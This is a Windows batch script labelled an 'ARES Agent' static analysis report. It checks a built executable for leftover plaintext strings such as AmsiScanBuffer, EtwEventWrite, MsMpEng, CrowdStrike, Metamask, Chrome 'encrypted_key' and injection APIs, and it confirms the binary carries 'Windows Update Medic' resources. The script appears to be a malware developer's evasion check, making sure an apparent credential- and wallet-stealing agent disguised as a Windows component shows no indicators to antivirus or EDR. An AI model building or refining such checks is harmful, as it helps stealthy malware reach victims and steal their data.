@echo off
echo ============================================
echo   ARES Agent Static Analysis Report
echo ============================================
echo.

echo [1] PE Size:
for %%A in (build\ares_prod.exe) do echo     %%~zA bytes

echo.
echo [2] Dangerous plaintext string scan:
set FOUND=0

findstr /i "cmd.exe" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: cmd.exe && set FOUND=1
findstr /i "ShellExecute" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: ShellExecute && set FOUND=1
findstr /i "ping 127" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: ping 127 && set FOUND=1
findstr /i "del /f" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: del /f && set FOUND=1
findstr /c:"ARES" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: ARES && set FOUND=1
findstr /c:"ares_agent" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: ares_agent && set FOUND=1
findstr /c:"fprintf" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: fprintf && set FOUND=1
findstr /c:"v20_blocked" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: v20_blocked && set FOUND=1
findstr /c:"encrypted_key" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: encrypted_key && set FOUND=1
findstr /c:"ntdll.dll" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: ntdll.dll && set FOUND=1
findstr /c:"winhttp.dll" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: winhttp.dll && set FOUND=1
findstr /c:"AmsiScanBuffer" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: AmsiScanBuffer && set FOUND=1
findstr /c:"EtwEventWrite" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: EtwEventWrite && set FOUND=1
findstr /c:"MsMpEng" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: MsMpEng && set FOUND=1
findstr /c:"CrowdStrike" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: CrowdStrike && set FOUND=1
findstr /c:"Metamask" build\ares_prod.exe >NUL 2>&1 && echo     [!] FOUND: Metamask && set FOUND=1

if %FOUND%==0 echo     ALL CLEAN - no plaintext indicators

echo.
echo [3] PE Resources check:
findstr /c:"Windows Update" build\ares_prod.exe >NUL 2>&1 && echo     Resources: PRESENT (Windows Update Medic) || echo     Resources: MISSING

echo.
echo [4] Import table (high-risk APIs):
findstr /i "VirtualAlloc" build\ares_prod.exe >NUL 2>&1 && echo     [~] VirtualAlloc in IAT (expected for mem ops)
findstr /i "CreateRemoteThread" build\ares_prod.exe >NUL 2>&1 && echo     [!] CreateRemoteThread in IAT
findstr /i "WriteProcessMemory" build\ares_prod.exe >NUL 2>&1 && echo     [!] WriteProcessMemory in IAT
findstr /i "NtCreateThreadEx" build\ares_prod.exe >NUL 2>&1 && echo     [!] NtCreateThreadEx in binary

echo.
echo ============================================
echo   Analysis Complete
echo ============================================
